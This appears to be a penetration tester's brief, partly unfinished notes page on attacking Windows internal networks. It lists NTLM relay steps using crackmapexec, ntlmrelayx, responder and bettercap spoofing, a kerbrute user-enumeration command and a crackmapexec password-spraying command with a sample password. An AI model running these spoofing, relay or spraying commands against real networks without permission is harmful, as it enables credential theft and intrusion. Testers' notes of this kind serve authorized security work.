---
title: "Internal Infrastructure"
date: 2020-07-16T13:41:37+02:00
draft: false
---

#### Using Bettercap to MITM and catch hashes (TO WORK OUT)
1. Generate smb relay list with crackmapexec
2. Set up ntlmrelayx with smb2support and -socks
3. Fire up responder + bettercap (arp,dns+dhcpv6 spoofing)
4. ntlmrelayx sessions can be used with atexec and smbexec

```js
This is some code
```

#### MITM6 with ntlmrelayx ToDo

#### Finding DC using Kerbrute
Whether the usernames.txt in the following command contains valid usernames or not., the output will contain the DC's which kerbrute uses to identify the users with.
```kerbrute userenum -d <domanin> usernames.txt```

#### Password spraying using SMB with CME

```crackmapexec smb <DomainController> -d <Domain> -u users.txt -p Welkom01 --continue-on-success```